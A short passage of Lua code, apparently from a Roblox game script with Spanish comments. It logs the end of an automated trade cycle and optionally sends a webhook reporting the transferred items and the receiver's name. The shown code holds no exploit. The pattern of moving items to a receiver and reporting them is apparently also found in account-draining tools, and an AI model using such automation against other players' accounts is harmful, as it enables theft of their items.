    log(string.format("Trade cerrado | fase=%s | lote anterior aun en inventario=%d | inventario seleccionado=%d", phase, stillHere, #remaining))
    if activeWebhook.SEND_AFTER_TRADE then
        task.spawn(sendInventoryWebhook, activeWebhook, receiverName,
            stillHere == 0 and "TRANSFERRED" or "CLOSED_OR_CANCELLED", items, phase)
    end
    -- No se excluye nada manualmente: el siguiente ciclo decide con el inventario
    -- real. Asi, si el trade fue cancelado, no se pierden items del proceso.
end
